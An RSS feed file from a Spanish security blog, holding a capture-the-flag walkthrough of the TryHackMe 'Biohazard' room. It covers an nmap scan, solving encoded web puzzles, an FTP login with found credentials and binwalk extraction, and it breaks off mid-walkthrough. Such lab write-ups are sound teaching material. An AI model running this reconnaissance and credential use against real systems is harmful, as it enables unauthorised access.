@@ -1,0 +1,1155 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>vigenere on sckull</title>
+    <link>https://sckull.github.io/tags/vigenere/</link>
+    <description>Recent content in vigenere on sckull</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>es</language>
+    <copyright>©{year}, All Rights Reserved</copyright>
+    <lastBuildDate>Tue, 11 Aug 2020 00:00:00 +0000</lastBuildDate>
+    <sy:updatePeriod>daily</sy:updatePeriod>
+    <sy:updateFrequency>daily</sy:updateFrequency>
+    
+        <atom:link href="https://sckull.github.io/tags/vigenere/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+
+      
+      <item>
+        <title>TryHackMe - Biohazard</title>
+        <link>https://sckull.github.io/posts/biohazard/</link>
+        <pubDate>Tue, 11 Aug 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Tue, 11 Aug 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/biohazard/</guid>
+        <description>Biohazard es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Biohazard es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Biohazard&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;A CTF room based on the old-time survival horror game, Resident Evil. Can you survive until the end?&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;630&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Media&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;DesKel&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Aug 11 17:52:02 2020 as: nmap -sV -o mini_scan biohazard.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; biohazard.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.159.66&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Aug 11 17:52:52 2020 -- 1 IP address (1 host up) scanned in 49.51 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165404.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;nightmare&#34;&gt;NIGHTMARE&lt;/h2&gt;
+&lt;p&gt;Esta pagina nos lleva hacia otra &lt;code&gt;/mansionmain/&lt;/code&gt; donde encontramos otra direccion en un comentario del codigo fuente.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165727.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En la nueva pagina encontramos un &lt;code&gt;input&lt;/code&gt; donde debemos de ingresar un &amp;ldquo;emblema&amp;rdquo;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165809.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Tambien encontramos en el codigo fuente una cadena codificada en base64, que al decodificarla nos muestra una nueva direccion.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_165933.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En esta nueva direccion encontramos otra &lt;code&gt;/artRoom/&lt;/code&gt;, además otra pagina que contiene un &lt;code&gt;Lockpick&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_170317.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/artRoom/&lt;/code&gt;, vemos una nueva pagina que al visitarla encontramos la direccion o &amp;ldquo;el mapa&amp;rdquo; de la mansion.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_170528.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/diningRoom2F/&lt;/code&gt;, en esta direccion encontramos un mensaje codificado en un comentario del codigo fuente de la pagina.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_170911.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Utilizamos &lt;a href=&#34;https://www.dcode.fr/caesar-cipher&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje codificado en el que nos indican una pagina donde podemos encontrar la gema azul.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171027.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;strong&gt;Blue Jewel&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171133.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/galleryRoom/&lt;/code&gt; encontramos una nota en la que indica que los mensajes estan codificados, el primer crest contiene 18 letras decodificado y que debemos encontrar 4 crest para obtener el mensaje y la combinacion es: &lt;code&gt;crest 1 + crest 2 + crest 3 + crest 4&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171447.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 2.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_171829.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/barRoom/&lt;/code&gt; debemos de ingresar la falg lockpick, es la que encontramos en &lt;code&gt;/artRoom/&lt;/code&gt;, al ingresarla nos redirige a una nueva pagina donde vemos nuevamente un input y una nota musical codificada.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172419.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;strong&gt;NOTA Musical&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172535.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para decodificar la cadena, en donde nos muestra una nueva &amp;ldquo;flag&amp;rdquo;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172633.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Al ingresar la &amp;ldquo;flag&amp;rdquo; en el input que encontramos nos redirige nuevamente a otra pagina donde vemos el emblema de oro y además nos muestra la pagina donde encontramos la &amp;ldquo;flag&amp;rdquo; y que debemos de regresar a la pagina anterior (en donde pide el emblema) e ingresar la &amp;ldquo;flag&amp;rdquo;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172812.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;strong&gt;Emblema de ORO&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_172851.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Regresamos a &lt;code&gt;/diningRoom/&lt;/code&gt; nuevamente e ingresamos la &amp;ldquo;flag&amp;rdquo; del emblema de oro, nos devuelve un mensaje.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_173253.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para obtener el mansaje donde nos indica la pagina donde esta la &lt;code&gt;Shield key&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_174113.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Visitamos la pagina donde nos indica y vemos la &amp;ldquo;flag&amp;rdquo;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_174405.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/attic/&lt;/code&gt; nos pide ingresar el &lt;code&gt;Shield key&lt;/code&gt; que supuestamente esta incrustado en la puerta, al ingresar la &amp;ldquo;flag&amp;rdquo; nos redirige hacia otra pagina donde encontramos otra nota en donde encontramos otro crest.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175023.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 4.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175115.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/tigerStatusRoom/&lt;/code&gt; nos pide una gema, ingresamos la &amp;ldquo;flag&amp;rdquo; &lt;code&gt;Blue Jewel&lt;/code&gt; y nos devuelve un mensaje donde se encuentra el crest 1.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175455.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 1.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175540.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/armorRoom/&lt;/code&gt; nos pide tambien &lt;code&gt;Shield key&lt;/code&gt; ingresamos y tambien, encontramos una nota en la nueva pagina, en donde encontramos la ultima crest.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_180248.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 3.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_180325.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;crests&#34;&gt;CRESTS&lt;/h2&gt;
+&lt;p&gt;Una vez con todas las crest encontradas utilizamos la combinacion dada, al decodificar el mensaje nos muestra unas credenciales para el servicio FTP.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_180502.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Ingresamos por el servicio FTP con las credenciales que encontramos varios archivos entre ellos 3 imagenes jpg, un archivo de texto y una clave gpg.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/biohazard/tmp# ftp biohazard.thm 
+Connected to biohazard.thm.
+&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;biohazard.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: hunter
+&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
+Password:
+&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
+Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -lah
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .
+drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; ..
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;7994&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; 001-key.jpg
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;2210&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; 002-key.jpg
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;2146&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; 003-key.jpg
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;121&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; helmet_key.txt.gpg
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;170&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; important.txt
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
+ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_181716.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#important.txt &lt;/span&gt;
+
+Jill,
+
+I think the helmet key is inside the text file, but I have no clue on decrypting stuff. 
+Also, I come across a /hidden_closet/ door but it was locked.
+
+From,
+Barry
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;En una de las imagenes encontramos un archivo incrustado, pero al extraerlo y decodificarlo este no esta completo y seguramente el resto del mensaje esta en las imagenes restantes.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_181913.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En la segunda imagen utilizamos &lt;code&gt;strings&lt;/code&gt; y en la tercera &lt;code&gt;binwalk&lt;/code&gt; para encontrar el mensaje restante.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182116.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/biohazard/tmp# binwalk -e 003-key.jpg 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             JPEG image data, JFIF standard 1.01
+&lt;span class=&#34;m&#34;&gt;1930&lt;/span&gt;          0x78A           Zip archive data, at least v2.0 to extract, uncompressed size: 14, name: key-003.txt
+&lt;span class=&#34;m&#34;&gt;2124&lt;/span&gt;          0x84C           End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
+root@upset:~/thm/biohazard/tmp# cat _003-key.jpg.extracted/key-003.txt 
+3aXRoX3Zqb2x0
+root@upset:~/thm/biohazard/tmp#
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje completo, para obtener el mensaje en el archivo gpg.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182402.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos el mensaje o frase para obtener el mensaje, en donde encontramos la &amp;ldquo;flag&amp;rdquo; &lt;code&gt;Helmet Key&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182616.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos la &amp;ldquo;flag&amp;rdquo; en &lt;code&gt;/studyRoom/&lt;/code&gt; el cual nos redirige hacia una nueva pagina y donde encontramos un archivo tar, el contenido de este es un archivo de texto con un nombre de usuario.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182856.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;En &lt;code&gt;/hidden_closet/&lt;/code&gt; tambien nos pedia el &lt;code&gt;Helmet Key&lt;/code&gt; al ingresarlo encontramos una pagina donde vemos dos archivos de texto. El primer archivo contiene un mensaje codificado.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#MO_DISK1.txt&lt;/span&gt;
+wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
